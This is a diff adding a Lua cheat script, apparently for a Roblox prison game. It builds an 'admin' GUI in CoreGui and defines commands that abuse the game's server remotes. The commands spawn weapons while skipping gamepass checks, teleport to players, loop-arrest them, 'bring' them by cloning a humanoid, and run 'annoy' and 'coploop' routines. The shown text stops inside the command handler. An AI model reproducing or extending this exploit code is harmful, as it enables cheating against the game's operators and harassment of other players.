@@ -1,0 +1,2252 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Commands = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextBox = Instance.new("TextBox")
+local UICorner_2 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local Colorf = Instance.new("Frame")
+local Holder = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local Bar = Instance.new("Frame")
+local UICorner_5 = Instance.new("UICorner")
+local prcvida = Instance.new("TextLabel")
+local Dmg = Instance.new("ImageLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Commands.Name = "Commands"
+Commands.Parent = ScreenGui
+Commands.BackgroundColor3 = Color3.fromRGB(0, 85, 127)
+Commands.BackgroundTransparency = 0.450
+Commands.Position = UDim2.new(-0.192000002, 0, 0, 0)
+Commands.Size = UDim2.new(0, 247, 0, 65)
+
+UICorner.Parent = Commands
+
+TextBox.Parent = Commands
+TextBox.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+TextBox.Position = UDim2.new(0.0643903017, 0, 0.451105684, 0)
+TextBox.Size = UDim2.new(0, 207, 0, 29)
+TextBox.Font = Enum.Font.SourceSansBold
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 14.000
+
+UICorner_2.Parent = TextBox
+
+TextLabel.Parent = Commands
+TextLabel.BackgroundColor3 = Color3.fromRGB(0, 85, 127)
+TextLabel.Position = UDim2.new(0.0779039338, 0, 0.0989408046, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 16)
+TextLabel.Font = Enum.Font.Cartoon
+TextLabel.Text = "JUAN ADMIN"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 17.000
+TextLabel.TextWrapped = true
+
+UICorner_3.Parent = TextLabel
+
+Colorf.Name = "Colorf"
+Colorf.Parent = Commands
+Colorf.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+Colorf.Size = UDim2.new(0, 100, 0, 100)
+Colorf.Visible = false
+
+Holder.Name = "Holder"
+Holder.Parent = ScreenGui
+Holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Holder.BackgroundTransparency = 0.750
+Holder.Position = UDim2.new(0.906000018, 0, -0.023, 0)
+Holder.Size = UDim2.new(0, 113, 0, 14)
+
+UICorner_4.Parent = Holder
+
+Bar.Name = "Bar"
+Bar.Parent = Holder
+Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+Bar.Position = UDim2.new(0.0567913242, 0, 0.367021471, 0)
+Bar.Size = UDim2.new(0, 100, 0, 3)
+
+UICorner_5.Parent = Bar
+
+prcvida.Name = "prcvida"
+prcvida.Parent = Holder
+prcvida.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+prcvida.BackgroundTransparency = 1.000
+prcvida.Position = UDim2.new(0.345, 0, -0.643, 0)
+prcvida.Size = UDim2.new(0, 34, 0, 22)
+prcvida.Font = Enum.Font.JosefinSans
+prcvida.Text = "100%"
+prcvida.TextColor3 = Color3.fromRGB(255, 255, 255)
+prcvida.TextSize = 14.000
+
+Dmg.Name = "Dmg"
+Dmg.Parent = ScreenGui
+Dmg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Dmg.BackgroundTransparency = 1.000
+Dmg.Position = UDim2.new(-0.000732148532, 0, -0.000840485096, 0)
+Dmg.Size = UDim2.new(1, 0, 1, 0)
+Dmg.ImageTransparency = 1.000
+
+-- Scripts:
+
+local function XIQW_fake_script() -- Commands.Pldata 
+	local script = Instance.new('LocalScript', Commands)
+
+	-- GETTING PLAYER DATA
+
+	local playerg = game.Players.LocalPlayer
+	local userId = playerg.UserId
+
+	script.Parent.TextLabel.Text = playerg.Name
+
+	-- ADMINS
+	local colorfav = script.Parent.Colorf
+
+	if playerg.Name == "ziiGhxst" then
+		colorfav.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+	else
+		if playerg.Name == "02Vxid" then
+			colorfav.BackgroundColor3 = Color3.fromRGB(85, 255, 255)
+		else
+			if playerg.Name == "HenryRenacuajo" then
+				colorfav.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+			end
+		end
+
+	end
+
+	local colorfavb = script.Parent.Colorf.BackgroundColor3
+
+	script.Parent.TextLabel.BackgroundColor3 = colorfavb
+	script.Parent.BackgroundColor3 = colorfavb
+end
+coroutine.wrap(XIQW_fake_script)()
+local function LOHXBN_fake_script() -- Commands.LocalScript 
+	local script = Instance.new('LocalScript', Commands)
+
+
+	script.Parent:TweenPosition(
+		UDim2.new(0, 0, 0, 0),
+		Enum.EasingDirection.InOut,
+		Enum.EasingStyle.Quad,
+		0.7,
+		true
+	)
+
+	script.Parent.TextBox:CaptureFocus()
+
+	local svxs = 1
+
+
+	local uis = game:GetService("UserInputService")
+
+	uis.InputBegan:Connect(function(Input, gameProcessedEvent)
+		if gameProcessedEvent then return end
+		if Input.KeyCode == Enum.KeyCode.Q and script.Parent.Visible == true then
+			script.Disabled = true
+
+			script.Parent:TweenPosition(
+				UDim2.new(-0.192, 0, 0, 0),
+				Enum.EasingDirection.InOut,
+				Enum.EasingStyle.Quad,
+				0.7,
+				true
+			)
+			wait(1)
+			script.Parent.Visible = false
+			script.Disabled = false	
+
+		else
+			if Input.KeyCode == Enum.KeyCode.Q and script.Parent.Visible == false then
+				script.Disabled = true
+				script.Parent.Visible = true
+
+				script.Parent:TweenPosition(
+					UDim2.new(0, 0, 0, 0),
+					Enum.EasingDirection.InOut,
+					Enum.EasingStyle.Quad,
+					0.7,
+					true
+				)
+				wait(1)
+
+				script.Parent.TextBox:CaptureFocus()
+
+				script.Disabled = false
+				script.Parent.Visible = true
+			end
+		end
+	end)
+
+	uis.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.Keyboard then
+			if input.KeyCode == Enum.KeyCode.Return then
+				script.Disabled = true
+
+				script.Parent:TweenPosition(
+					UDim2.new(-0.192, 0, 0, 0),
+					Enum.EasingDirection.InOut,
+					Enum.EasingStyle.Quad,
+					0.7,
+					true
+				)
+				wait(1)
+				script.Parent.Visible = false
+				script.Disabled = false	
+			end
+		end
+	end) 
+end
+coroutine.wrap(LOHXBN_fake_script)()
+
+-- function
+
+local states = {}
+
+states.GUNCOLOR = false
+states.IsCounting = false
+states.LoopTP = false
+states.SILENCEGUNS = false
+states.AUTORE = false
+states.AUTOLOCK = false
+states.AUTOGUNS = false
+states.ANTISPAM = false
+states.COPLOOP = false
+states.ANNOY = false
+states.GODMODE = false
+states.ANTICRIM = false
+states.BLACKLIST = true
+
+function arr(plr)
+	workspace.Remote.arrest:InvokeServer(plr.Character.Torso)
+end
+
+function refreshT(color)
+	local position = workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.CFrame
+	local _, RY, _ = position:ToOrientation()
+	position = CFrame.new(position.p) * CFrame.fromOrientation(0, RY, 0)
+
+	local camera = workspace.CurrentCamera.CFrame
+
+	if tostring(game.Players.LocalPlayer.TeamColor) == 'Medium stone grey' and color == nil then
+		workspace.Remote.TeamEvent:FireServer("Bright orange")
+
+		wait()
+
+		workspace.Remote.loadchar:InvokeServer()
+
+		workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+	else
+		workspace.Remote.loadchar:InvokeServer(nil,color)
+	end
+
+	local HumanoidRootPart = workspace:FindFirstChild(game.Players.LocalPlayer.Name):WaitForChild('HumanoidRootPart',0.3)
+
+	HumanoidRootPart.CFrame = position
+
+	workspace.CurrentCamera.CFrame = camera
+	workspace.CurrentCamera.Changed:Wait()
+	workspace.CurrentCamera.CFrame = camera
+
+	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+end
+
+function NoCrims(color)
+	local position = CFrame.new(917, 100, 2387)
+	local _, RY, _ = position:ToOrientation()
+	position = CFrame.new(position.p) * CFrame.fromOrientation(0, RY, 0)
+
+	local camera = workspace.CurrentCamera.CFrame
+
+	if tostring(game.Players.LocalPlayer.TeamColor) == 'Medium stone grey' and color == nil then
+		workspace.Remote.TeamEvent:FireServer("Bright orange")
+
+		wait()
+
+		workspace.Remote.loadchar:InvokeServer()
+
+		workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+	else
+		workspace.Remote.loadchar:InvokeServer(nil,color)
+	end
+
+	local HumanoidRootPart = workspace:FindFirstChild(game.Players.LocalPlayer.Name):WaitForChild('HumanoidRootPart',0.3)
+
+	HumanoidRootPart.CFrame = position
+
+	workspace.CurrentCamera.CFrame = camera
+	workspace.CurrentCamera.Changed:Wait()
+	workspace.CurrentCamera.CFrame = camera
+
+	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+end
+
+local UserId = tonumber((game:GetService("Players").LocalPlayer.CharacterAppearance):split('=')[#((game:GetService("Players").LocalPlayer.CharacterAppearance):split('='))])
+
+local UserName = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://api.roblox.com/users/'..UserId)).Username
+
+local function toPlayer(play)
+	local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
+	local pl2 = play
+	local humanoid = game.Players.LocalPlayer.Character.Humanoid
+	humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+	wait(0.1)
+
+	pl.CFrame = game.Players[pl2].Character.HumanoidRootPart.CFrame
+end
+
+function refreshColor()
+	local colorfavz = Colorf.BackgroundColor3
+
+	TextLabel.BackgroundColor3 = colorfavz
+	Commands.BackgroundColor3 = colorfavz
+
+	local xd = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.ClockFrame
+
+	local xdxd = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.MenuButton
+
+	local ashn = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.GunFrame
+
+	local dauh = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.GunFrame.Frame
+
+	local dadu = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.Topbar.Pulldownmenu
+
+	local jhis = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.Topbar.titleBar
+
+	local ajwi = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.Topbar.Pulldownmenu.tb
+
+	xd.BackgroundColor3 = colorfavz
+
+	xdxd.BackgroundColor3 = colorfavz
+
+	ashn.BackgroundColor3 = colorfavz
+
+	dauh.BackgroundColor3 = colorfavz
+
+	dadu.BackgroundColor3 = colorfavz
+
+	jhis.BackgroundColor3 = colorfavz
+
+	ajwi.BackgroundColor3 = colorfavz
+
+	if states.GUNCOLOR == true then
+		if game:GetService("Players").LocalPlayer.Backpack["Remington 870"] then
+			for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Model:GetChildren()) do
+				v.BrickColor = BrickColor.new(colorfavz)
+			end
+		else
+			print(".")
+		end
+
+		if game:GetService("Players").LocalPlayer.Backpack["AK-47"] then
+			for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["AK-47"].Model:GetChildren()) do
+				v.BrickColor = BrickColor.new(colorfavz)
+			end
+		else
+			print(".")
+		end
+
+		if game:GetService("Players").LocalPlayer.Backpack.M9 then
+			game:GetService("Players").LocalPlayer.Backpack.M9.Part.BrickColor = BrickColor.new(colorfavz)
+		else
+			print(".")
+		end
+
+		if game:GetService("Players").LocalPlayer.Backpack.M4A1 then
+			for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack.M4A1.Model:GetChildren()) do
+				v.BrickColor = BrickColor.new(colorfavz)
+			end
+		else
+			print(".")
+		end
+	end
+end
+
+function chatnotify(text)
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[ADMIN] "..text; Color = Colorf.BackgroundColor3; Font = Enum.Font.SourceSansBold; FontSize = Enum.FontSize.Size42})
+end
+
+function Warning(text)
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[WARNING] "..text; Color = Color3.fromRGB(216, 0, 0); Font = Enum.Font.SourceSansBold; FontSize = Enum.FontSize.Size42})
+end
+
+function Blacklist(text)
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[BLACKLIST] "..text; Color = Color3.fromRGB(170, 0, 127); Font = Enum.Font.SourceSansBold; FontSize = Enum.FontSize.Size42})
+end
+
+local function getGuns()
+	local guards = GetPlayersInTeam("Guards")
+
+	for i,v in pairs(guards) do
+		if v == game:GetService("Players").LocalPlayer then
+
+
+			game:GetService("Players").LocalPlayer.Backpack.M9.Parent = game:GetService("Lighting")
+
+			game:GetService("Players").LocalPlayer.Backpack.Taser.Parent = game:GetService("Lighting")
+
+			game:GetService("Players").LocalPlayer.Backpack.Handcuffs.Parent = game:GetService("Lighting")
+		end
+	end
+
+	wait()
+
+	local colorfavz = Colorf.BackgroundColor3
+	--M4A1----------------------------------------------------
+	if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
+		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
+
+		if states.GUNCOLOR == true then
+			if game:GetService("Players").LocalPlayer.Backpack.M4A1 then
+				for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack.M4A1.Model:GetChildren()) do
+					v.BrickColor = BrickColor.new(colorfavz)
+				end
+			end
+		end
+
+		if states.SILENCEGUNS == true and states.OLDGUNS == false  then
+			game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.FireSound.SoundId = 0
+
+			game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.ReloadSound.SoundId = 0
+		end
+
+		if states.OLDGUNS == true then
+			game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.FireSound.SoundId = "rbxassetid://282003150"
+
+			game:GetService("Players").LocalPlayer.Backpack.M4A1.Handle.ReloadSound.SoundId = "rbxassetid://142491708"
+		end
+	else --If you don't have gamepass for M4A1 then you will get the converted AK-47
+		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
+		require(game.Players.LocalPlayer.Backpack:FindFirstChild("AK-47"):FindFirstChild("GunStates"))["FireRate"] = 0.09
+		if states.GUNCOLOR == true then
+			if game:GetService("Players").LocalPlayer.Backpack["AK-47"] then
+				for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["AK-47"].Model:GetChildren()) do
+					v.BrickColor = BrickColor.new(colorfavz)
+				end
+			end
+		end
+
+		if states.OLDGUNS == true then
+			game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.FireSound.SoundId = "rbxassetid://153230498"
+
+			game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.ReloadSound.SoundId = "rbxassetid://142491708"
+		end
+
+		if states.SILENCEGUNS == true and states.OLDGUNS == false then
+			game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.FireSound.SoundId = 0
+
+			game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.ReloadSound.SoundId = 0
+		end
+	end
+
+	----------------------------------------------------------
+	--Remington870--------------------------------------------
+	game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) --Remington 870
+
+	if states.GUNCOLOR == true then
+		if game:GetService("Players").LocalPlayer.Backpack["Remington 870"] then
+			for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Model:GetChildren()) do
+				v.BrickColor = BrickColor.new(colorfavz)
+			end
+		end
+	end
+
+	if states.SILENCEGUNS == true and states.OLDGUNS == false then
+		game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.FireSound.SoundId = 0
+
+		game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.ReloadSound.SoundId = 0
+	end
+
+	if states.OLDGUNS == true then
+		game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.FireSound.SoundId = "rbxassetid://138083993"
+
+		game:GetService("Players").LocalPlayer.Backpack["Remington 870"].Handle.ReloadSound.SoundId = "rbxassetid://145081845"
+	end
+
+	----------------------------------------------------------
+
+	--AK-47---------------------------------------------------
+	if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
+		--If you don't have gamepass for M4A1 then you will not get this AK-47
+		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
+	end
+
+	if states.GUNCOLOR == true then
+		if game:GetService("Players").LocalPlayer.Backpack["AK-47"] then
+			for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack["AK-47"].Model:GetChildren()) do
+				v.BrickColor = BrickColor.new(colorfavz)
+			end
+		end
+	end
+
+	if states.OLDGUNS == true then
+		game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.FireSound.SoundId = "rbxassetid://153230498"
+
+		game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.ReloadSound.SoundId = "rbxassetid://142491708"
+	end
+
+	if states.SILENCEGUNS == true and states.OLDGUNS == false then
+		game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.FireSound.SoundId = 0
+
+		game:GetService("Players").LocalPlayer.Backpack["AK-47"].Handle.ReloadSound.SoundId = 0
+	end
+	----------------------------------------------------------
+
+	for i,v in pairs(guards) do
+		if v == game:GetService("Players").LocalPlayer then
+			game:GetService("Lighting").M9.Parent = game:GetService("Players").LocalPlayer.Backpack
+
+			wait()
+			if states.GUNCOLOR == true then
+				if game:GetService("Players").LocalPlayer.Backpack.M9 then
+					game:GetService("Players").LocalPlayer.Backpack.M9.Part.BrickColor = BrickColor.new(colorfavz)
+				end
+			end
+			game:GetService("Lighting").Taser.Parent = game:GetService("Players").LocalPlayer.Backpack
+			wait()
+			game:GetService("Lighting").Handcuffs.Parent = game:GetService("Players").LocalPlayer.Backpack
+		else
+			game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+			if game.Players.LocalPlayer:FindFirstChild("M9") then
+				game.Players.LocalPlayer:FindFirstChild("M9").Parent = game.Players.LocalPlayer.Backpack
+			end
+			if states.GUNCOLOR == true then
+				if game:GetService("Players").LocalPlayer.Backpack.M9 then
+					game:GetService("Players").LocalPlayer.Backpack.M9.Part.BrickColor = BrickColor.new(colorfavz)
+				end
+			end
+
+			if states.SILENCEGUNS == true and states.OLDGUNS == false then
+				game:GetService("Players").LocalPlayer.Backpack.M9.Handle.FireSound.SoundId = 0
+
+				game:GetService("Players").LocalPlayer.Backpack.M9.Handle.ReloadSound.SoundId = 0
+			end
+
+			if states.OLDGUNS == true then
+				game:GetService("Players").LocalPlayer.Backpack.M9.Handle.FireSound.SoundId = "rbxassetid://134436500"
+
+				game:GetService("Players").LocalPlayer.Backpack.M9.Handle.ReloadSound.SoundId = "rbxassetid://142491708"
+			end
+		end
+	end
+end
+
+function GetRootOri()
+	a1,a2,a3 = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame:ToOrientation()
+	return CFrame.new(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame.X, game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame.Y, game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame.Z) * CFrame.fromOrientation(0,a2,0)
+end
+
+function GetROC()
+	s1,s2,s3 = game.Players.LocalPlayer.Character:WaitForChild("Head").CFrame:ToOrientation()
+	return CFrame.new(game.Players.LocalPlayer.Character:WaitForChild("Head").CFrame.X, game.Players.LocalPlayer.Character:WaitForChild("Head").CFrame.Y, game.Players.LocalPlayer.Character:WaitForChild("Head").CFrame.Z) * CFrame.fromOrientation(0,s2,0)
+end
+
+function healthBar()
+	local StarterGui = game:GetService("StarterGui")
+
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+
+	local Bar = Bar
+	local Player = game.Players.LocalPlayer 
+
+	repeat wait() until Player.Character or Player.CharacterAdded:Wait()
+
+	local Character = Player.Character
+	local Humanoid = Character:FindFirstChild("Humanoid")
+
+	local GreenColor = Color3.fromRGB(0, 255, 0)
+	local RedColor = Color3.fromRGB(170, 0, 0)
+	local YellowColor = Color3.fromRGB(154, 154, 0)
+
+	local cHealth = Humanoid.Health
+
+	Humanoid.HealthChanged:Connect(function(Health)
+
+		local Health = math.floor(Health)
+
+		Bar.Size = UDim2.new(0, Health, 0, 3)
+
+		prcvida.Text = tostring(Health .. "%")
+
+		if Health > 75 then
+			Bar.BackgroundColor3 = GreenColor
+
+		elseif Health < 74 and Health > 40 then
+			Bar.BackgroundColor3 = YellowColor
+
+		elseif Health < 40 then
+			Bar.BackgroundColor3 = RedColor
+		end
+
+		if Health < cHealth then
+			local dmg = Dmg
+
+			dmg.BackgroundTransparency = 0.9
+			wait(.06)
+			dmg.BackgroundTransparency = 1
+			cHealth = Health
+		end
+	end)
+end
+
+function refreshHBar()
+	local StarterGui = game:GetService("StarterGui")
+
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+
+	local Player = game.Players.LocalPlayer 
+	local Character = Player.Character
+	local Humanoid = Character:FindFirstChild("Humanoid")
+
+	local Health = Humanoid.Health
+
+	local GreenColor = Color3.fromRGB(0, 255, 0)
+	local RedColor = Color3.fromRGB(170, 0, 0)
+	local YellowColor = Color3.fromRGB(154, 154, 0)
+
+	local health = math.floor(Health)
+
+	prcvida.Text = tostring(Health .. "%")
+
+	Bar.Size = UDim2.new(0, health, 0, 3)
+
+	if health > 75 then
+		Bar.BackgroundColor3 = GreenColor
+
+	elseif health < 74 and health > 40 then
+		Bar.BackgroundColor3 = YellowColor
+
+	elseif health < 40 then
+		Bar.BackgroundColor3 = RedColor
+	end
+end
+
+
+local function humanoidDied()
+	if states.AUTORE == true then
+		local lastPos = GetRootOri()
+		local lastCam = workspace.CurrentCamera.CFrame
+		game:GetService("Workspace").Remote.loadchar:InvokeServer()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastPos
+		workspace.CurrentCamera.CFrame = lastCam
+		game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+
+		refreshHBar()
+		healthBar()
+
+		local char = workspace:FindFirstChild(UserName)
+		char.Humanoid.Died:Connect(humanoidDied)
+
+		if states.AUTOGUNS == true then
+			getGuns()
+		end
+
+		if states.AUTOLOCK == true then
+			wait(0.03)
+			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
+			game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+			game.Players.LocalPlayer.CharacterAdded:connect(function()
+				game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
+				game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+			end)
+		end
+
+		healthBar()
+	end
+end
+
+healthBar()
+
+local function GetPlayerFromString(nameString)
+	if not nameString then return end 
+	local matches= {}
+	for _, player in ipairs (game.Players:GetPlayers()) do
+		if string.lower(player.Name):match(string.lower(nameString)) then
+			table.insert(matches, player)
+		end
+	end
+	if #matches== 1 then
+		return matches[1]
+	else
+		return nil
+	end
+end
+
+function respawns()
+	local lastPos = GetRootOri()
+	local lastCam = workspace.CurrentCamera.CFrame
+	game:GetService("Workspace").Remote.loadchar:InvokeServer()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastPos
+	workspace.CurrentCamera.CFrame = lastCam
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+
+	refreshHBar()
+
+	if states.AUTOLOCK == true then
+		wait(0.03)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
+		game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+		game.Players.LocalPlayer.CharacterAdded:connect(function()
+			game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
+			game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+		end)
+	end
+
+	if states.AUTORE == true then
+		local char = workspace:FindFirstChild(UserName)
+
+		char.Humanoid.Died:Connect(humanoidDied)
+	end
+
+	if states.AUTOGUNS == true then
+		getGuns()
+	end
+end
+
+function GetPlayersInTeam(TeamName)
+	return game:GetService("Teams")[tostring(TeamName)]:GetPlayers()
+end
+
+function chat(message)
+	local args = {
+		[1] = message,
+		[2] = "All"
+	}
+
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+end
+
+function bring(target,u)
+	speaker = game.Players.LocalPlayer
+	workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+	wait()
+	if target ~= nil then
+		local NormPos = speaker.Character.HumanoidRootPart.CFrame
+		savecf = speaker.Character.HumanoidRootPart.CFrame
+		workspace.Remote.loadchar:InvokeServer()
+		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+		wait()
+		speaker.Character.HumanoidRootPart.CFrame = savecf
+		wait()
+		repeat wait() until speaker.Character ~= nil and speaker.Character.HumanoidRootPart
+		wait(0.3)
+
+		local hrp = speaker.Character.HumanoidRootPart
+		local char = speaker.Character
+		local tchar = target.Character
+		local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
+		local hrp = speaker.Character.HumanoidRootPart
+		local hrp2 = target.Character.HumanoidRootPart
+		hum.Name = "1"
+		local newHum = hum:Clone()
+		newHum.Parent = char
+		newHum.Name = "Humanoid"
+		wait()
+		hum:Destroy()
+		workspace.CurrentCamera.CameraSubject = char
+		newHum.DisplayDistanceType = "None"
+		local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
+		tool.Parent = char
+		hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
+		local n = 0
+		repeat
+			wait(.1)
+			n = n + 1
+			hrp.CFrame = hrp2.CFrame
+		until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
+		for i = 1,10 do
+			wait()
+			hrp.CFrame = NormPos
+		end
+		workspace.Remote.loadchar:InvokeServer()
+		wait()
+		querty = NormPos * CFrame.Angles(math.rad(-180), 0, 0)
+		wait(0.3)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = querty
+	end
+end
+
+function arrest(plr, times)
+	local times = times or 1
+	if plr.TeamColor.Name == "Really red" then
+		local m_char = workspace:FindFirstChild(UserName)
+		local m_h = m_char and m_char:FindFirstChild("HumanoidRootPart")
+		local plr_char = workspace:FindFirstChild(plr.Name)
+		local plr_h = plr_char and plr_char:FindFirstChild("HumanoidRootPart")
+		if m_char and m_h and plr_char and plr_h then 
+			local savedcframe = m_h.CFrame
+			repeat 
+				m_h.CFrame = plr_h.CFrame * CFrame.new(0,0,1.3)
+				local args = {plr_char:FindFirstChild("Head")}
+				for i=1,times do 
+					workspace.Remote.arrest:InvokeServer(unpack(args))
+				end
+			until plr_char.Head:FindFirstChild("handcuffedGui")
+			m_char.Humanoid.Sit = false
+			m_h.CFrame = savedcframe
+		end
+	end
+end
+
+-- command function
+local frame = Commands
+local box = TextBox
+
+
+local function get_command()
+	local command = {}
+	for word in string.gmatch(box.Text, "%S+") do
+		table.insert(command, word)
+	end
+	local action = command[1]
+	local person = command[2]
+	local person2 = command[3]
+	local person3 = command[4]
+
+	local actions = {
+		"antilag",
+		"re",
+		"guns",
+		"gc",
+		"guncolor",
+		"rejoin",
+		"rj",
+		"count",
+		"cf",
+		"loadsa",
+		"loadmold",
+		"loadmnew",
+		"loads",
+		"loadsb",
+		"to",
+		"looptp",
+		"unlooptp",
+		"silenceguns",
+		"hitmarker",
+		"team",
+		"autore",
+		"auto",
+		"autorespawn",
+		"lock",
+		"autolock",
+		"autol",
+		"antispam",
+		"base",
+		"pvp",
+		"cells",
+		"yard",
+		"roof",
+		"cafe",
+		"nex",
+		"armory",
+		"back",
+		"autoguns",
+		"t",
+		"bri",
+		"end",
+		"coploop",
+		"cl",
+		"sa",
+		"spamarrest",
+		"bring",
+		"arrest",
+		"arr",
+		"view",
+		"unview",
+		"v",
+		"unv",
+		"annoy",
+		"unannoy",
+		"oldguns",
+		"god",
+		"ff",
+		"loopff",
+		"anticrim",
+		"loopcrim",
+		"unloopcrim",
+		"blacklist"
+	}
+	local function valid_command()
+		for _, command in pairs(actions) do
+			if command == action then
+				return true
+			end
+		end
+	end
+
+	local function do_command()
+		if valid_command(action) == true then
+			if action == "re" then
+				local lastPos = GetRootOri()
+				local lastCam = workspace.CurrentCamera.CFrame
+				game:GetService("Workspace").Remote.loadchar:InvokeServer()
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastPos
+				workspace.CurrentCamera.CFrame = lastCam
+				game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+
+				healthBar()
+			end
+			
+			if action == "blacklist" then
+				if person == "on" then
+					states.BLACKLIST = true
+					chatnotify("BLACKLIST ACTIVADA")
+				else
+					if person == "off" then
+						states.BLACKLIST = false
+						chatnotify("BLACKLIST DESACTIVADA")
+					end
+				end
+			end
+			if action == "rj" then
+				game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+			end
+
+			if action == "rejoin" then
+				game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+			end
+
+			if action == "guns" then
+				getGuns()
+			end
+
+			if action == "bri" then
+				game.Lighting.Brightness = tonumber(person)
